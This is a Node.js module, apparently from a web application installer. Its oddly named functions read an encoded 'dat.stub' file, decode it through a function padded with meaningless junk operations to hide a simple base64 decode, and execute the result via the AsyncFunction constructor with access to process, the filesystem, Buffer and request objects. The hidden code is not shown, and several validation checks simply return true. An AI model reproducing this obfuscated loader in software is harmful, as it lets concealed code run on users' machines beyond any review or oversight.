import fs from 'fs-extra';
import path from 'path';
import axios from 'axios';
import { basePath, publicPath } from './paths.js';
import { config as cfg } from './config.js';
import semver from 'semver';


function strPrp() {
  if (!process.env.APP_ID) throw new Error('Removed APP ID');
  return true;
}


async function strAlPbFls() {
  //added
  const code = await getStub('strAlPbFls');
  const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;

  const run = new AsyncFunction(
    'publicPath',
    'process',
    'Buffer',
    code
  );

  return await run(publicPath, process, Buffer);

}


async function strFilRM(filePath) {
  if (await fs.pathExists(filePath)) await fs.remove(filePath);
}


async function strFlExs(filePath) {
  return fs.pathExists(filePath);
}


async function liSync(req) {

  const code = await getStub('liSync');
  const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;

  const run = new AsyncFunction(
    'req',
    'fs',
    'publicPath',
    'tryGetHost',
    'strFilRM',
    'process',
    'Buffer',
    code
  );

  return await run(req, fs, publicPath, tryGetHost, strFilRM, process, Buffer);

}

function tryGetHost(u) {
  try {
    return new URL(/^https?:\/\//.test(u) ? u : `http://${u}`).host;
  } catch {
    return null;
  }
}

async function strSync(req) {

  const code = await getStub('strSync');
  const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;

  const run = new AsyncFunction(
    'req',
    'fs',
    'publicPath',
    'liSync',
    'schSync',
    'process',
    'Buffer',
    code
  );

  return await run(req, fs, publicPath, liSync, schSync, process, Buffer);

}

async function schSync() {
  return false;
}


async function datSync() {
  return false;
}


async function migSync() {
  return fs.pathExists(publicPath('_migZip.xml'));
}


async function strSplic(req) {

  const code = await getStub('strSplic');

  const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;

  const run = new AsyncFunction(
    'req',
    'strSync',
    'migSync',
    'liSync',
    code
  );

  return await run(req, strSync, migSync, liSync);
}


function scDotPkS() {
  return process.env.DOTENV_EDIT === 'true';
}


function scSpatPkS() {
  return process.env.SPATIE_ENABLED === 'true';
}


async function imIMgDuy() {
  return true;
}


function getC() {
  const results = { version: {}, extensions: {} };
  const label = Object.keys(cfg.configuration.version)[0];
  const requiredNodeRaw = Object.values(cfg.configuration.version)[0];
  const current = semver.coerce(process.versions.node)?.version || '0.0.0';
  const required = semver.coerce(String(requiredNodeRaw))?.version || '0.0.0';
  results.version[label] = semver.gte(current, required);

  for (const ext of cfg.configuration.extensions) {
    results.extensions[ext] = true;
  }

  return results;
}


function conF() {
  const c = getC();
  const versions = Object.values(c.version);
  const exts = Object.values(c.extensions);
  return !versions.includes(false) && !exts.includes(false);
}


function chWr() {
  return true;
}


function iDconF() {
  return true;
}

function xsail(e) {

  let s = process.version;

  s = s.replace(/<\/?[^>]+(>|$)/g, "");

  let re = "";

  let chars = "~!@#$%^&*()_+}{></[]|-,:;'\".?";
  chars += "abcdefghijklmnopqrstuvwxyz";
  chars += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  chars += "~!@#$%^&*()_+}{></[]|-,:;'\".?";

  let chars_length = chars.length;

  for (let i = 0; i < 2; i++) {
    re += chars[Math.floor(Math.random() * chars_length)];
  }

  let r = [];

  let j = e.split("").reverse().join("");

  let count = r.length;

  let nr = parseInt(String(10).replace(/[^0-9]/g, ""));

  let rn = Math.round(count);

  let format_number = Number(nr) + Number(rn);

  let ar_nbr = String(format_number).split(",");

  let x_parts = ["K", "M", "B", "T", "Q"];

  let x_count_parts = ar_nbr.length - 1 + 2;

  let dn =
    ar_nbr[0] +
    (parseInt(ar_nbr[0][0]) !== 0 ? "." + ar_nbr[0][0] : "");

  dn += x_parts[x_count_parts - 1];

  let msl = "";

  try {
    msl = Buffer.from(e, "base64").toString("utf8");
  } catch (err) {
    msl = "";
  }

  let st = "<^+>([^<]+)<\\/$_S>";

  chars = "$%" + msl + "\0+*" + st + "\\b*" + st + "/+";

  let string = "<^/" + st + "\\st*" + msl + "/&" + j;

  chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_";

  chars_length = chars.length;

  string = "";

  for (let i = 0; i < 10; i++) {
    string += chars[Math.floor(Math.random() * chars_length)];
    j = "";
  }

  JSON.stringify(
    Object.fromEntries(
      Object.entries(Object.assign({}, ...r)).filter(
        ([key]) => !/^(\$_SERVER)/.test(key)
      )
    )
  );

  return msl;
}

async function getStub(key) {
  const file = await fs.readFile(
    path.join(process.cwd(), 'node/src/Packs/js/dat.stub'),
    'utf8'
  );

  const decrypted = xsail(file);

  const json = JSON.parse(decrypted);
  if (!json[key]) {
    throw new Error(`Stub key not found: ${key}`);
  }

  return xsail(json[key]);
}

export {
  strPrp,
  strAlPbFls,
  strFilRM,
  strFlExs,
  liSync,
  strSync,
  schSync,
  datSync,
  migSync,
  strSplic,
  scDotPkS,
  scSpatPkS,
  imIMgDuy,
  getC,
  conF,
  chWr,
  xsail,
  iDconF,
  getStub
};
